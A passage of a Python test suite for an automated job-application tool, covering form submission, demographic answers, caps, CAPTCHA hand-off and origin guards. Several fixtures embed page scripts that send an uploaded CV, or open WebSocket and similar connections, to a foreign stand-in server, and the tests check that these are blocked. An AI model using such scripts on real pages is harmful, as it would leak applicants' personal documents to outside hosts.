        <option value="yes">Yes</option><option value="private">Prefer not to say</option></select><button>""")
    server.html["/jobs/100"] = page_html
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))

    def plan(snapshot):
        assert store.active_reservations(profile.id)
        if snapshot.title == "Merci":
            return StepPlan(page_kind="confirmation")
        return form(snapshot)

    result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(plan))
    assert result.status == "submitted", (result.message, server.posts)
    assert result.result.consent_codes == ["application_privacy"]
    assert len(server.posts) == 1
    assert b"privacy=on" in server.posts[0]["body"] and b"eeo=private" in server.posts[0]["body"]
    assert b"marketing=" not in server.posts[0]["body"]
    assert result.result.dispatch_diagnostics.model_dump() == {
        "step": 1, "control": "final_submit", "receipt_kind": "first_party_confirmation", "receipt_reason": "confirmation_text",
        "email": None, "aborted_hosts": [], "aborted_requests": 0,
    }


@pytest.mark.parametrize("attested", [False, True])
async def test_autonomous_routing_uses_supervised_adapter_only_for_identity(
    attested, production_pool, server, profile, tmp_path, fast, monkeypatch,
):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    monkeypatch.setattr(service.get_settings(), "apply_auto", True)
    url = server.url("adapter-contract") if attested else server.url("jobs/100")
    server.html["/jobs/100"] = posting_form("/jobs/100")
    job, app = approved_fixture(profile, tmp_path, url)
    calls = []

    class Adapter:
        name = "routing-fixture"
        capability = "unattended" if attested else "supervised"
        retry_rule = "never"
        boundaries = {"final_submit": "auto" if attested else "forbidden"}

        def matches(self, target, dom_markers):
            return float(origin(target) == server.base)

        def resolve(self, target, dom_markers):
            return Requisition("fixture-tenant", "req-1", endpoints=(
                ("final_submit", server.url("adapter-contract/{tenant}/{requisition}")),
            ))

        async def dispatch(self, request, gate):
            assert attested
            calls.append("dispatch")
            return await gate.perform("final_submit", server.url("adapter-contract/fixture-tenant/req-1"), attach_pdf=True)

        async def verify_receipt(self, attempt, *, evidence):
            return Receipt(attempt, "confirmed", "first_party_confirmation", "fixture",
                           evidence.headers["X-Fixture-Receipt"], evidence.headers["X-Fixture-Requisition"])

    registry = Registry()
    registry.register(Adapter(), host="127.0.0.1", unattended_tenants={"fixture-tenant": "first_party_confirmation"} if attested else None)
    monkeypatch.setattr(service, "registry", registry)
    result = await service.run(app.id, mode="submit", trigger="auto", pool=production_pool, planner=ScriptedPlanner(form))
    assert result.status == "submitted", result.message
    assert calls == (["dispatch"] if attested else [])
    expected_path = "/adapter-contract/fixture-tenant/req-1" if attested else "/jobs/100"
    assert [post["path"] for post in server.posts] == [expected_path]
    assert result.result.dispatch_diagnostics.receipt_reason == ("attested" if attested else "confirmation_text")
    with db.connect() as conn:
        binding = json.loads(conn.execute("SELECT binding_json FROM apply_reservations WHERE run_id=?", (result.id,)).fetchone()[0])
    assert (binding["tenant"], binding["requisition_id"]) == ("fixture-tenant", "req-1")
    assert binding.get("autonomous", False) is not attested
    assert binding["adapter"] == ("routing-fixture" if attested else None)
    _, duplicate = approved_fixture(profile, tmp_path, server.url("jobs/200"), title="Other title", company="Other alias")
    repeated = await service.run(duplicate.id, mode="submit", trigger="auto", pool=production_pool, planner=ScriptedPlanner(form))
    assert repeated.status == "blocked" and len(server.posts) == 1


@pytest.mark.parametrize(("question", "option_html", "stored", "expected"), [
    ("Race or ethnicity", '<option value="listed">Black or African American</option>', "Black", "listed"),
    ("Origine ethnique", '<option value="listed">Noire</option>', "Black", "listed"),
    ("Ethnische Herkunft", '<option value="listed">Schwarz</option>', "Black", "listed"),
    ("Voluntary self-identification", '<option value="listed">Black / African</option>', "Black", "listed"),
    ("Race or ethnicity", '<option value="unrelated">African American</option>', "Black", "private"),
    ("Race or ethnicity", '<option value="listed">Black</option>', "", "private"),
    ("Gender", '<option value="unrelated">Black</option>', "Black", "private"),
    ("Race or ethnicity", '<option value="unrelated">No equivalent</option>', "Black", None),
    ("Race or ethnicity", '<option value="listed" disabled>Black</option>', "Black", "private"),
    ("Race or ethnicity", '<option value="one">Black</option><option value="two">Noire</option>', "Black", "private"),
])
async def test_production_autonomous_race_ethnicity_choice(
    question, option_html, stored, expected, production_pool, server, profile, tmp_path, fast, monkeypatch,
):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    job, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    save_answers(profile.id, {"race_ethnicity": stored})
    fact = service._candidate_facts(app, job).get("race_ethnicity")
    assert (fact.value or "") == stored
    opt_out = '<option value="private">Prefer not to say</option>' if expected is not None else ""
    server.html["/jobs/100"] = posting_form("/jobs/100").replace("<button>", f"""
        <label for="eeo">{question}</label><select id="eeo" name="eeo" required>
          <option value="">Choose</option>{option_html}{opt_out}
        </select><button>""")

    class LocalPlanner(ScriptedPlanner):
        async def plan(self, snap, facts, **kwargs):
            assert facts.get("race_ethnicity") is None
            return await super().plan(snap, facts, **kwargs)

    result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=LocalPlanner(form))
    if expected is None:
        assert result.status == "needs_input" and not server.posts
    else:
        assert result.status == "submitted", result.message
        assert f"eeo={expected}".encode() in server.posts[0]["body"]
        if expected == "listed":
            selected = next(field for field in result.result.steps[0].filled if field.fact == "eeo_race_ethnicity")
            assert selected.value == "Choix confirmé"


@pytest.mark.parametrize("control,change", [("select", False), ("radio", False), ("select", True), ("radio", True)])
async def test_production_race_ethnicity_revalidates_exact_options_at_write(
    control, change, production_pool, server, profile, tmp_path, fast, monkeypatch,
):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    save_answers(profile.id, {"race_ethnicity": "Black"})
    if control == "select":
        question = ('<label for="eeo">Race or ethnicity</label><select id="eeo" name="eeo" required>'
                    '<option value="">Choose</option><option value="listed">Black</option>'
                    '<option id="other" value="private">Prefer not to say</option></select>')
    else:
        question = ('<fieldset><legend>Race or ethnicity</legend>'
                    '<label><input type="radio" name="eeo" value="listed" required>Black</label>'
                    '<label><input type="radio" name="eeo" value="private"><span id="other">Prefer not to say</span></label>'
                    '</fieldset>')
    server.html["/jobs/100"] = posting_form("/jobs/100").replace("<button>", question + "<button>") + """
        <script>document.addEventListener('change', event => {
          if (event.target.name === 'eeo') document.body.dataset.choice = event.target.value;
        });</script>"""
    before = engine._Run._before_mutation
    apply_choice = engine.apply_demographic_choice
    observed = []

    async def change_after_check(run, op, target):
        await before(run, op, target)
        if change and op == "select":
            await run.page.locator("#other").evaluate("node => { node.textContent = 'Changed option'; }")

    async def observe_choice(target, *args, **kwargs):
        applied = await apply_choice(target, *args, **kwargs)
        observed.append(await target.evaluate("node => node.ownerDocument.body.dataset.choice || ''"))
        return applied

    monkeypatch.setattr(engine._Run, "_before_mutation", change_after_check)
    monkeypatch.setattr(engine, "apply_demographic_choice", observe_choice)
    result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
    assert observed == ([""] if change else ["listed"])
    if change:
        assert result.status == "blocked", result.message
        assert not server.posts
    else:
        assert result.status == "submitted", result.message
        assert any(b"eeo=listed" in post["body"] for post in server.posts)


@pytest.mark.parametrize("scenario", ["wrong_query", "other_base", "formaction", "external_image", "late_formaction", "same_posting"])
async def test_production_autonomous_checks_browser_resolved_submission_target(
    scenario, production_pool, server, profile, tmp_path, fast, monkeypatch,
):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    path = "/jobs/100"
    page_html = posting_form({"wrong_query": path + "?jobId=200", "other_base": "#"}.get(scenario, path))
    if scenario == "other_base":
        page_html = '<base href="/jobs/200">' + page_html
    if scenario in {"formaction", "same_posting"}:
        endpoint = "/jobs/200" if scenario == "formaction" else path + "/send?jobId=100"
        page_html = page_html.replace("<button>", f'<button formaction="{endpoint}">')
    if scenario == "external_image":
        page_html = page_html.replace("<form ", '<form id="application" ') + (
            '<input type="image" form="application" formaction="/jobs/200" alt="Autre envoi">'
        )
    server.html[path] = page_html
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    original = Audience.target
    final_checks = []

    async def target(audience, control, *, button=False, final=False):
        if final:
            final_checks.append(True)
            if scenario == "late_formaction":
                await control.evaluate("node => node.setAttribute('formaction', '/jobs/100?jobId=200')")
        return await original(audience, control, button=button, final=final)

    monkeypatch.setattr(Audience, "target", target)
    result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
    if scenario == "same_posting":
        assert result.status == "submitted", result.message
        assert [post["path"] for post in server.posts] == [path + "/send?jobId=100"]
    else:
        assert result.status in {"needs_input", "needs_human", "blocked"}, result.message
        assert not server.sent and result.submit_clicked_at is None
        if scenario == "late_formaction":
            assert final_checks == [True]
        else:
            assert not any(step.filled for step in result.result.steps)


@pytest.mark.parametrize("restriction", ["cap", "breaker", "kill", "duplicate", "captcha"])
async def test_production_autonomous_batch_gates(restriction, production_pool, server, profile, tmp_path, fast, monkeypatch):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", restriction != "kill")
    monkeypatch.setattr(service.get_settings(), "apply_daily_cap", 1 if restriction == "cap" else 40)
    apps = []
    for index, label in enumerate(("Plombier", "Horlogère", "Libraire"), 100):
        path = f"/jobs/{index}"
        server.html[path] = posting_form(path)
        if restriction in {"breaker", "duplicate"}:
            server.post_pages[path] = "bare_done.html"
        kwargs = {"extra": {"origin_resolution": {"canonical_ok": True, "submit_ats": "lever", "tenant": "fixture", "requisition": "ABC"}}} if restriction == "duplicate" else {}
        _, app = approved_fixture(profile, tmp_path, server.base + path, company=f"{label} SAS", title=label, **kwargs)
        apps.append(app)
    if restriction == "captcha":
        server.redirects["/jobs/100"] = "/jobs/100/captcha"
        server.html["/jobs/100/captcha"] = '<title>Vérification</title><div class="g-recaptcha" data-sitekey="fixture">Je ne suis pas un robot</div>'
    runs = await service.send_selected([app.id for app in apps], pool=production_pool, planner=ScriptedPlanner(form))
    expected = {
        "cap": ["submitted", "blocked", "blocked"], "breaker": ["failed", "failed", "blocked"],
        "kill": ["blocked"] * 3, "duplicate": ["failed", "blocked", "blocked"],
        "captcha": ["needs_human", "submitted", "submitted"],
    }[restriction]
    assert [run.status for run in runs] == expected, [(run.status, run.message) for run in runs]
    assert len(server.posts) == {"cap": 1, "breaker": 2, "kill": 0, "duplicate": 1, "captcha": 2}[restriction]
    if restriction in {"breaker", "duplicate"}:
        trace = runs[0].result.dispatch_diagnostics
        assert (trace.step, trace.control, trace.receipt_kind, trace.receipt_reason) == (1, "final_submit", "none", "no_confirmation")
        assert store.outstanding_attempt(apps[0].id).id == runs[0].id
        retried = await service.run(apps[0].id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
        assert retried.status == "blocked"
        assert len(server.posts) == (2 if restriction == "breaker" else 1)
    if restriction == "breaker":
        assert store.host_paused("127.0.0.1") and "supervisé" in runs[2].message


async def test_production_autonomous_aborts_foreign_write_after_upload_and_still_sends(production_pool, server, profile, tmp_path, fast, monkeypatch):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    with closing(FixtureServer()) as receiver:
        server.html["/jobs/100"] = posting_form("/jobs/100") + f"""<script>
        cv.onchange = async () => {{
            await fetch('/upload', {{method: 'POST', body: cv.files[0]}});
            await fetch('{receiver.base}/foreign', {{method: 'POST', body: cv.files[0]}});
        }};
        </script>"""
        server.post_pages["/jobs/100"] = "confirmation.html"
        _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
        result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
        # The foreign copy of the CV never leaves the browser; the window stays open and the bound send goes through.
        assert server.posts_to("/upload") and not receiver.posts and len(server.posts_to("/jobs/100")) == 1
        assert result.status == "submitted", result.message
        assert result.result.dispatch_diagnostics.aborted_hosts == ["127.0.0.1"]


async def test_production_autonomous_aborts_page_script_write_before_final_click(production_pool, server, profile, tmp_path, fast, monkeypatch):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    server.html["/jobs/100"] = posting_form("/jobs/100") + """<script>
        document.querySelector('#name').oninput = () => fetch('/jobs/100', {method: 'POST', body: 'synthetic'});
    </script>"""
    server.post_pages["/jobs/100"] = "confirmation.html"
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
    # The script's write after input, outside an armed click, is aborted; only the guarded final click reaches the server.
    assert result.status == "submitted", result.message
    assert [post["body"] for post in server.posts] == [b"first_name=Camille&cv=CV.pdf"]
    assert result.result.dispatch_diagnostics.aborted_requests >= 1


async def test_production_autonomous_allows_sibling_upload(production_pool, server, profile, tmp_path, fast, monkeypatch):
    from patchright.async_api import Route

    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    job_origin = "https://careers.example.com"
    sibling = "https://uploads.example.com"
    server.html["/jobs/100"] = posting_form("/jobs/100").replace(
        "</form>", f"""</form><script>cv.onchange = () => fetch('{sibling}/upload',
        {{method: 'POST', body: cv.files[0], mode: 'no-cors'}});</script>""")
    original = Route.fetch
    async def loopback_fetch(route, **kwargs):
        requested = urlsplit(route.request.url)
        assert origin(route.request.url) in {job_origin, sibling}
        return await original(route, url=server.base + requested.path, **kwargs)

    monkeypatch.setattr(Route, "fetch", loopback_fetch)
    _, app = approved_fixture(profile, tmp_path, job_origin + "/jobs/100")
    result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
    assert result.status == "submitted", result.message
    assert server.posts_to("/upload")[0]["body"].startswith(b"%PDF-")


def test_autonomous_public_suffixes_do_not_bridge_private_tenants():
    from jobhunt.apply.autonomous import Audience

    audience = Audience("https://jobs.first.appspot.com/jobs/100", (), lambda: None)
    assert audience.write_recipient("https://upload.first.appspot.com/cv")
    assert not audience.write_recipient("https://upload.second.appspot.com/cv")


async def test_production_autonomous_wrong_posting_redirect_is_not_followed(production_pool, server, profile, tmp_path, fast, monkeypatch):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    server.redirects["/jobs/100"] = "/jobs/200"
    server.html["/jobs/200"] = posting_form("/jobs/200")
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
    assert result.status == "needs_human" and "/jobs/200" not in server.requests and not server.posts


@pytest.mark.parametrize("target", ["iframe", "action", "changed_action", "missing_id", "other_id", "other_origin", "other_base",
                                    "query_other", "formaction"])
async def test_production_generic_skips_unbound_targets(target, production_pool, server, profile, tmp_path, fast, monkeypatch):
    server.html["/jobs/200"] = '<label for="other">Autre prénom</label><input id="other" name="other">'
    action = {"action": "/jobs/200", "missing_id": "/apply", "other_id": "/jobs/100/REQ-2",
              "other_origin": "https://other.example.test/jobs/100", "other_base": "../100",
              "query_other": "/jobs/100?jobId=200"}.get(target, "/jobs/100/apply")
    submitter = '<button formaction="/jobs/200">Postuler</button>' if target == "formaction" else ""
    other = f'<form action="{action}">{server.html["/jobs/200"]}{submitter}</form>'
    server.html["/jobs/100"] = posting_form("#") + ('<iframe src="/jobs/200"></iframe>' if target == "iframe" else other)
    if target == "other_base":
        server.html["/jobs/100"] += '<base href="https://other.example.test/jobs/100/">'
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))

    def plan(snapshot):
        return StepPlan(page_kind="form", actions=[act(snapshot, "Autre prénom", "fill", "first_name"),
                                                   act(snapshot, "^Prénom", "fill", "first_name")])

    original = engine._Run._live_decisions

    async def change_after_scan(self, *args, **kwargs):
        await original(self, *args, **kwargs)
        if target == "changed_action" and args[1].name == "other":
            await self.page.evaluate("document.querySelector('#other').form.action = '/jobs/200'")

    monkeypatch.setattr(engine._Run, "_live_decisions", change_after_scan)
    task = asyncio.create_task(service.run(app.id, mode="supervised", trigger="user", pool=production_pool,
                                           planner=ScriptedPlanner(plan)))
    opened = await wait_for_supervised(app.id, task)
    try:
        result = await confirm_step(app.id)
        assert result.status == "needs_input" and "à remplir à la main" in result.steps[0].note
        # With a foreign <base href>, the main form's action="#" submits to that other origin too: it stays manual.
        assert bool(await opened.input_value("#name")) is (target != "other_base")
        manual = opened.frame_locator("iframe").locator("#other") if target == "iframe" else opened.locator("#other")
        assert not await manual.input_value() and not server.posts
    finally:
        await opened.close()
        result = await asyncio.wait_for(task, 10)
    assert store.outstanding_attempt(app.id).id == result.id


async def test_production_generic_hash_action_resolves_against_base(production_pool, server, profile, tmp_path, fast):
    """`action="#"` under a same-origin `<base href>` for another posting submits to that posting: leave it manual."""
    server.html["/jobs/100"] = '<base href="/jobs/200">' + posting_form("#")
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    task = asyncio.create_task(service.run(app.id, mode="supervised", trigger="user", pool=production_pool,
                                           planner=ScriptedPlanner(lambda snapshot: StepPlan(
                                               page_kind="form", actions=[act(snapshot, "^Prénom", "fill", "first_name")]))))
    opened = await wait_for_supervised(app.id, task)
    try:
        result = await confirm_step(app.id)
        assert result.status == "needs_input" and "à remplir à la main" in result.steps[0].note
        assert not await opened.input_value("#name") and not server.posts
    finally:
        await opened.close()
        result = await asyncio.wait_for(task, 10)
    assert store.outstanding_attempt(app.id).id == result.id


@pytest.mark.parametrize(("document", "raw", "resolved", "submitters", "allowed"), [
    ("https://jobs.test/jobs/100", None, None, [], True),
    ("https://jobs.test/jobs/100", "#", "https://jobs.test/jobs/100#", [], True),
    ("https://jobs.test/jobs/100", "#", "https://jobs.test/jobs/200#", [], False),
    ("https://jobs.test/jobs/100", "?jobId=200", "https://jobs.test/jobs/100?jobId=200", [], False),
    ("https://jobs.test/jobs/100", "apply", "https://jobs.test/jobs/100/apply", [], True),
    ("https://jobs.test/jobs/100", "apply", "https://jobs.test/jobs/100/apply", ["https://jobs.test/jobs/200"], False),
    ("https://jobs.test/careers/engineer", "/apply", "https://jobs.test/apply", [], True),
    ("https://jobs.test/careers?jobId=100", "/apply?jobId=100", "https://jobs.test/apply?jobId=100", [], True),
    ("https://jobs.test/careers?jobId=100", "/apply?jobId=200", "https://jobs.test/apply?jobId=200", [], False),
    ("https://jobs.test/jobs/100", "https://other.test/jobs/100", "https://other.test/jobs/100", [], False),
])
def test_generic_action_target_rules(document, raw, resolved, submitters, allowed):
    from jobhunt.apply.supervised import _generic_action_allowed
    assert _generic_action_allowed(document, raw, resolved, submitters) is allowed


@pytest.mark.parametrize("navigation", ["reload", "replace", "same_path_push_state", "during_scan"])
async def test_production_generic_confirmation_dies_on_navigation(navigation, production_pool, server, profile, tmp_path, fast, monkeypatch):
    server.html["/jobs/100"] = posting_form("/jobs/100") + "<h1>Ingénieur systèmes embarqués</h1>"
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    original = engine._Run._live_decisions
    changed = False

    async def navigate_after_scan(self, *args, **kwargs):
        nonlocal changed
        await original(self, *args, **kwargs)
        if navigation == "during_scan" and not changed:
            changed = True
            async with self.page.expect_event("framenavigated"):
                await self.page.evaluate("history.pushState({changed: true}, '', location.href)")

    monkeypatch.setattr(engine._Run, "_live_decisions", navigate_after_scan)
    task = asyncio.create_task(service.run(app.id, mode="supervised", trigger="user", pool=production_pool,
                                           planner=ScriptedPlanner(form)))
    opened = await wait_for_supervised(app.id, task)
    try:
        preview = await service.preview_fill_step(app.id)
        if navigation == "during_scan":
            result = await service.fill_step(app.id, preview.token)
            assert "confirmez de nouveau" in result.message
        else:
            async with opened.expect_event("framenavigated", timeout=5000):
                if navigation == "reload":
                    await opened.reload(wait_until="domcontentloaded")
                elif navigation == "replace":
                    await opened.evaluate("() => location.replace(location.href)")
                else:
                    await opened.evaluate("history.pushState({changed: true}, '', location.pathname)")
            with pytest.raises(ApplyError, match="confirmez de nouveau"):
                await service.fill_step(app.id, preview.token)
        assert not opened.is_closed() and not await opened.input_value("#name") and not server.posts
        await confirm_step(app.id)
        assert await opened.input_value("#name")
    finally:
        await opened.close()
        await asyncio.wait_for(task, 10)


@pytest.mark.parametrize("status", ["failed", "blocked"])
async def test_production_failure_persists_no_page_text(status, production_pool, server, profile, tmp_path, fast, monkeypatch):
    server.html["/jobs/100"] = posting_form("/jobs/100") + "<p>Use the following code to sign in: 654321</p>"
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))

    async def fail_from_page(page, **_):
        text = await page.locator("p").inner_text()
        return RunResult(status=status, message=text, final_url=page.url,
                         steps=[StepLog(index=1, url=page.url, page_kind="other", note=text, clicked=text)])

    monkeypatch.setattr(service, "run_application", fail_from_page)
    task = asyncio.create_task(service.run(app.id, mode="supervised", trigger="user", pool=production_pool,
                                           planner=ScriptedPlanner(form)))
    opened = await wait_for_supervised(app.id, task)
    try:
        await confirm_step(app.id)
    finally:
        await opened.close()
        result = await asyncio.wait_for(task, 10)
    with db.connect() as conn:
        raw_message, raw_json = conn.execute("SELECT message, result_json FROM application_runs WHERE id=?", (result.id,)).fetchone()
    assert all(secret not in raw_message + raw_json for secret in ("following", "654321", "/jobs/100"))
    assert result.result.diagnostic_code == "credential_page" and not result.result.steps


@pytest.mark.parametrize("change", ["redirect", "spa", "frame", "action"])
async def test_production_adapter_checks_live_posting_identity(change, production_pool, server, profile, tmp_path, fast, monkeypatch):
    server.html["/jobs/100"] = posting_form("/jobs/200" if change == "action" else "/jobs/100")
    server.html["/jobs/200"] = posting_form("/jobs/200")
    if change == "redirect":
        server.redirects["/jobs/100"] = "/jobs/200"
    if change == "frame":
        server.html["/jobs/100"] = '<iframe src="/jobs/200"></iframe>'
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))

    class Adapter:
        name = "posting-fixture"
        capability = "supervised"
        retry_rule = "never"
        boundaries = {"draft_write": "auto", "cv_upload_parse": "auto"}

        def matches(self, url, dom_markers):
            return float(origin(url) == server.base)

        def resolve(self, url, dom_markers):
            path = urlsplit(url).path
            if self.matches(url, dom_markers) and path in {"/jobs/100", "/jobs/200"}:
                return Requisition("fixture", path.rsplit("/", 1)[1])

        async def supervise(self, request, fill):
            class Planner(ScriptedPlanner):
                async def plan(self, *args, **kwargs):
                    if change == "spa":
                        page = service._SUPERVISED[app.id].page
                        await page.evaluate("history.pushState({}, '', '/jobs/200')")
                    return await super().plan(*args, **kwargs)

            await fill(Planner(form))
            return RunResult(status="ready", message="Must not mask the engine's refusal")

    registry = Registry()
    registry.register(Adapter(), host="127.0.0.1")
    monkeypatch.setattr(service, "registry", registry)
    result = await asyncio.wait_for(service.run(app.id, mode="supervised", trigger="user", pool=production_pool), 16)
    assert "poste" in result.message and not server.posts and not production_pool._contexts
    assert store.outstanding_attempt(app.id).id == result.id
    assert not any(step.filled for step in result.result.steps)


@pytest.mark.parametrize("change", ["url", "heading", "during_planner"])
async def test_production_generic_fill_requires_fresh_confirmation(change, production_pool, server, profile, tmp_path, fast):
    server.redirects["/jobs/100"] = "/jobs/200"
    server.html["/jobs/200"] = posting_form("").replace("Ingénieur systèmes embarqués", "Technicien comptable")
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))

    class Planner(ScriptedPlanner):
        async def plan(self, *args, **kwargs):
            if change == "during_planner" and not self.calls:
                await opened.evaluate("history.pushState({}, '', '/jobs/300')")
            return await super().plan(*args, **kwargs)

    planner = Planner(form)
    task = asyncio.create_task(service.run(app.id, mode="supervised", trigger="user", pool=production_pool, planner=planner))
    opened = await wait_for_supervised(app.id, task)
    try:
        assert not planner.calls and not await opened.input_value("#name")
        preview = await service.preview_fill_step(app.id)
        assert preview.warning and preview.reserved_url.endswith("/jobs/100") and preview.page_url.endswith("/jobs/200")
        if change == "during_planner":
            result = await service.fill_step(app.id, preview.token)
            assert "confirmez de nouveau" in result.message
        else:
            script = {"url": "history.pushState({}, '', '/jobs/300')", "heading": "document.title = 'Autre poste'"}[change]
            await opened.evaluate(script)
            with pytest.raises(ApplyError, match="confirmez de nouveau"):
                await service.fill_step(app.id, preview.token)
        assert not opened.is_closed() and not await opened.input_value("#name")
        await confirm_step(app.id)
        assert await opened.input_value("#name") and not server.posts
    finally:
        await opened.close()
        await asyncio.wait_for(task, 10)


@pytest.mark.skipif(not HAS_LOCAL_BRIDGE, reason="exercises the Unix-socket fill-step CLI bridge (absent on Windows)")
@pytest.mark.parametrize("invalidate", ["settled", "approval", "pdf"])
async def test_production_fill_step_reuses_reservation_and_refuses_stale_reentry(invalidate, production_pool, server, profile, tmp_path, fast, monkeypatch):
    import socket
    from conftest import _REAL_CONNECT
    from jobhunt.apply.supervised import _socket_path

    server.html["/jobs/100"] = posting_form("/jobs/100") + '<a href="/jobs/100/step2">Suivant</a>'
    server.html["/jobs/100/step2"] = posting_form("/jobs/100")
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    socket_path = str(_socket_path(app.id))
    offline_connect = socket.socket.connect

    def local_only(sock, address, *args, **kwargs):
        return (_REAL_CONNECT if address == socket_path else offline_connect)(sock, address, *args, **kwargs)

    monkeypatch.setattr(socket.socket, "connect", local_only)
    task = asyncio.create_task(service.run(app.id, mode="supervised", trigger="user", pool=production_pool,
                                           planner=ScriptedPlanner(form)))
    opened = await wait_for_supervised(app.id, task)
    try:
        first = await call_local(app.id, "preview")
        await call_local(app.id, "fill", first["token"])
        assert await opened.input_value("#name") and opened.url.endswith("/jobs/100")
        await opened.get_by_text("Suivant").click()
        await opened.wait_for_url("**/step2")
        assert not await opened.input_value("#name")
        second = await service.preview_fill_step(app.id)
        await service.fill_step(app.id, second.token, run_id=second.run_id)
        assert second.run_id == first["run_id"] and await opened.input_value("#name")
        assert len(store.active_reservations(profile.id)) == 1 and not server.posts
        last = await service.preview_fill_step(app.id)
        if invalidate == "settled":
            with db.connect() as conn:
                conn.execute("UPDATE apply_reservations SET released_at=? WHERE run_id=?", (db.now().isoformat(), last.run_id))
        elif invalidate == "approval":
            with db.connect() as conn:
                conn.execute("UPDATE applications SET approved_rev=NULL WHERE id=?", (app.id,))
        else:
            cvs.safe_pdf(app).write_bytes(b"%PDF-1.4 changed")
        with pytest.raises(ApplyError):
            await service.fill_step(app.id, last.token)
        assert opened.is_closed() and not server.posts
    finally:
        if not opened.is_closed():
            await opened.close()
        await asyncio.wait_for(task, 10)


async def test_production_supervised_non_http_is_inert_in_pages_frames_and_popups(production_pool, server, profile, tmp_path, fast):
    foreign = FixtureServer()
    try:
        target = foreign.url("collect")
        script = """<script>
        window.inert = ['WebSocket', 'WebTransport', 'RTCPeerConnection', 'RTCDataChannel', 'EventSource'].map(name => {
            try { new window[name](name === 'WebSocket' ? %s : %s); return false; }
            catch (error) { return error.name === 'SecurityError'; }
        });</script>""" % (json.dumps(target.replace("http:", "ws:")), json.dumps(target))
        server.html["/transport"] = script + '<iframe src="/transport-frame"></iframe>'
        server.html["/transport-frame"] = script
        _, app = approved_fixture(profile, tmp_path, server.url("transport"))

        task = asyncio.create_task(service.run(app.id, mode="supervised", trigger="user", pool=production_pool))
        opened = await wait_for_supervised(app.id, task)
        try:
            assert await opened.evaluate("window.inert", isolated_context=False) == [True] * 5
            frame = next(frame for frame in opened.frames if frame.url.endswith("/transport-frame"))
            assert await frame.evaluate("window.inert", isolated_context=False) == [True] * 5
            async with opened.expect_popup() as pending:
                await opened.evaluate("() => { window.open('/transport-frame'); }")
            popup = await pending.value
            await popup.wait_for_load_state("domcontentloaded")
            assert await popup.evaluate("window.inert", isolated_context=False) == [True] * 5
            await popup.close()
        finally:
            await opened.close()
            result = await asyncio.wait_for(task, timeout=10)
        assert not foreign.page_requests and not foreign.posts
        assert store.outstanding_attempt(app.id).id == result.id and not production_pool._contexts
    finally:
        foreign.close()


@pytest.mark.parametrize("kind", ["blank", "srcdoc", "dynamic", "worker", "shared_worker"])
async def test_production_transport_inert_in_fresh_realms(kind, production_pool, server, profile):
    foreign = FixtureServer()
    try:
        target = foreign.url("collect").replace("http:", "ws:")
        server.html["/realms"] = '<title>Fixture</title>'
        server.html["/frame"] = '<title>Frame</title>'
        async with production_pool.page(profile.id, "apply-supervised-realms", False) as opened:
            guard = RecipientGuard(frozenset({origin(server.base)}))
            await guard.install(opened)
            await guard.navigate(opened, server.url("realms"), production_pool.goto)
            checks = await opened.evaluate("""async ([kind, target]) => {
                const inert = (Constructor, ...args) => {
                    try { new Constructor(...args); return false; }
                    catch (error) { return error.name === 'SecurityError'; }
                };
                if (kind.endsWith('worker')) {
                    const script = `new WebSocket(${JSON.stringify(target)})`;
                    const url = URL.createObjectURL(new Blob([script], {type: 'text/javascript'}));
                    return [inert(kind === 'worker' ? Worker : SharedWorker, url)];
                }
                const frame = document.createElement('iframe');
                if (kind === 'srcdoc') frame.srcdoc = '<title>Embedded</title>';
                if (kind === 'dynamic') frame.src = '/frame';
                const loaded = new Promise(resolve => frame.addEventListener('load', resolve, {once:true}));
                document.body.appendChild(frame);
                const before = inert(frame.contentWindow.WebSocket, target);
                await loaded;
                return [before, inert(frame.contentWindow.WebSocket, target)];
            }""", [kind, target], isolated_context=False)
            assert all(checks) and not foreign.page_requests and not foreign.posts
    finally:
        foreign.close()


@pytest.mark.parametrize("scenario", ["same-origin", "six-hops", "off-origin"])
async def test_production_initial_redirects_are_bounded_and_validated(scenario, production_pool, server, profile):
    foreign = FixtureServer()
    try:
        server.redirects["/start"] = "/form" if scenario == "same-origin" else foreign.url("collect")
        if scenario == "six-hops":
            server.redirects["/start"] = "/hop-1"
            server.redirects.update({f"/hop-{hop}": f"/hop-{hop + 1}" for hop in range(1, 6)})
        async with production_pool.page(profile.id, "apply-supervised-redirect", False) as opened:
            guard = RecipientGuard(frozenset({origin(server.base)}))
            await guard.install(opened)
            async def goto(page, target):
                await page.goto(target, wait_until="domcontentloaded")
            if scenario == "off-origin":
                with pytest.raises(Exception):
                    await guard.navigate(opened, server.url("start"), goto)
            else:
